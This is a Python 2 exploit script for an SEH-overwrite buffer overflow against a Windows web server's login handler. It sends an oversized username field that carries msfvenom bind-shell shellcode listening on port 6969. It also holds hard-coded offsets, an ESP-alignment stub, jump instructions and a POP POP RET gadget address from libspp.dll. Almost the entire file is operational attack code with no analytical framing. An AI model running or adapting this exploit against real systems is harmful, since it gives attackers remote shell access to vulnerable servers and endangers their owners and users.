#!/usr/bin/env python
import sys, socket, struct, time
 
if len(sys.argv) <= 2:
    print "Usage: python " + sys.argv[0] + " [host] [port]"
    exit()
 
host = sys.argv[1]    
port = int(sys.argv[2])

# Shellcode
# msfvenom -p windows/shell_bind_tcp lport=6969 -v shellcode -f python -b "\x0a\x0d\x00\x26"
# Payload size: 355 bytes
shellcode =  ""
shellcode += "\xdb\xc9\xd9\x74\x24\xf4\xbe\x57\xe2\x74\x19\x5b"
shellcode += "\x33\xc9\xb1\x53\x31\x73\x17\x83\xc3\x04\x03\x24"
shellcode += "\xf1\x96\xec\x36\x1d\xd4\x0f\xc6\xde\xb9\x86\x23"
shellcode += "\xef\xf9\xfd\x20\x40\xca\x76\x64\x6d\xa1\xdb\x9c"
shellcode += "\xe6\xc7\xf3\x93\x4f\x6d\x22\x9a\x50\xde\x16\xbd"
shellcode += "\xd2\x1d\x4b\x1d\xea\xed\x9e\x5c\x2b\x13\x52\x0c"
shellcode += "\xe4\x5f\xc1\xa0\x81\x2a\xda\x4b\xd9\xbb\x5a\xa8"
shellcode += "\xaa\xba\x4b\x7f\xa0\xe4\x4b\x7e\x65\x9d\xc5\x98"
shellcode += "\x6a\x98\x9c\x13\x58\x56\x1f\xf5\x90\x97\x8c\x38"
shellcode += "\x1d\x6a\xcc\x7d\x9a\x95\xbb\x77\xd8\x28\xbc\x4c"
shellcode += "\xa2\xf6\x49\x56\x04\x7c\xe9\xb2\xb4\x51\x6c\x31"
shellcode += "\xba\x1e\xfa\x1d\xdf\xa1\x2f\x16\xdb\x2a\xce\xf8"
shellcode += "\x6d\x68\xf5\xdc\x36\x2a\x94\x45\x93\x9d\xa9\x95"
shellcode += "\x7c\x41\x0c\xde\x91\x96\x3d\xbd\xfd\x5b\x0c\x3d"
shellcode += "\xfe\xf3\x07\x4e\xcc\x5c\xbc\xd8\x7c\x14\x1a\x1f"
shellcode += "\x82\x0f\xda\x8f\x7d\xb0\x1b\x86\xb9\xe4\x4b\xb0"
shellcode += "\x68\x85\x07\x40\x94\x50\xbd\x48\x33\x0b\xa0\xb5"
shellcode += "\x83\xfb\x64\x15\x6c\x16\x6b\x4a\x8c\x19\xa1\xe3"
shellcode += "\x25\xe4\x4a\x10\x8f\x61\xac\x4c\xff\x27\x66\xf8"
shellcode += "\x3d\x1c\xbf\x9f\x3e\x76\x97\x37\x76\x90\x20\x38"
shellcode += "\x87\xb6\x06\xae\x0c\xd5\x92\xcf\x12\xf0\xb2\x98"
shellcode += "\x85\x8e\x52\xeb\x34\x8e\x7e\x9b\xd5\x1d\xe5\x5b"
shellcode += "\x93\x3d\xb2\x0c\xf4\xf0\xcb\xd8\xe8\xab\x65\xfe"
shellcode += "\xf0\x2a\x4d\xba\x2e\x8f\x50\x43\xa2\xab\x76\x53"
shellcode += "\x7a\x33\x33\x07\xd2\x62\xed\xf1\x94\xdc\x5f\xab"
shellcode += "\x4e\xb2\x09\x3b\x16\xf8\x89\x3d\x17\xd5\x7f\xa1"
shellcode += "\xa6\x80\x39\xde\x07\x45\xce\xa7\x75\xf5\x31\x72"
shellcode += "\x3e\x15\xd0\x56\x4b\xbe\x4d\x33\xf6\xa3\x6d\xee"
shellcode += "\x35\xda\xed\x1a\xc6\x19\xed\x6f\xc3\x66\xa9\x9c"
shellcode += "\xb9\xf7\x5c\xa2\x6e\xf7\x74"

# Bad characters: 0x0a 0x0d 0x26
badchars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"
"\x23\x24\x25\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43"
"\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63"
"\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83"
"\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3"
"\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3"
"\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        )

# Align ESP
align_esp = (    "\x54"                          # PUSH ESP
                    "\x58"                          # POP EAX
                    "\x66\x05\x22\x13"              # ADD AX, 0x1322
                    "\x50"                          # PUSH EAX
                    "\x5c"                          # POP ESP
                    "\xff\xe4"                      # JMP ESP
                )

# Maximum length
maxlength = 20000

# Offsets
crash_ebp = 2070
crash_ecx = 1960
crash_nseh = 14278
crash_seh = crash_nseh + 4

# Offset for negative jmp's
offset_jmp_1 = 14186
offset_jmp_2 = 32

# Negative jump after first jump
neg_jmp_2 = "\xe9\xb1\xc8\xff\xff"                      # E9B1C8FFFF        jmp 0xffffc8b6  # JMP's back to begin of buffer

# NOP's
nop = "\x90" * 32

# Crafting payload variables
prefix = "A" * offset_jmp_2
prefix += align_esp
prefix += nop
prefix += shellcode
prefix += "B" * (offset_jmp_1 - len(prefix))
prefix += neg_jmp_2
prefix += "C" * (crash_nseh - len(prefix))
nseh = struct.pack("<L", 0xa0774c4c)                    # DEC ESP # DEC ESP # JNO 0x3 # Jumps 0x80 back on ESP
seh = struct.pack("<L", 0x100159be)                     # POP POP RET # libspp.dll
suffix = "D" * (maxlength - len(prefix + nseh + seh))

payload = prefix + nseh + seh + suffix

print "[+] Connecting to " + host + "\n"

try:
        print "[+] Fuzzing with " + str(len(payload)) + " length message..."

    
        req = (
                "POST /login HTTP/1.1\r\n"
                "Host: " + host + ":" + str(port) + "\r\n"
                "User-Agent: hodorweb\r\n"
                "Connection: close\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-us,en;q=0.5\r\n"
                "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
                "Keep-Alive: 300\r\n"
                "Proxy-Connection: keep-alive\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 17000\r\n\r\n"
                "username=admin" + payload + "&password=12345\r\n\r\n"
        )
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.send(req)
        s.recv(1024)
        s.close()

        time.sleep(0.5)
    
except Exception,e:
        print "[!] Error occured: " + str(e)
        print "[*] Crashed occured at buffer length: " + str(len(payload))
        sys.exit()

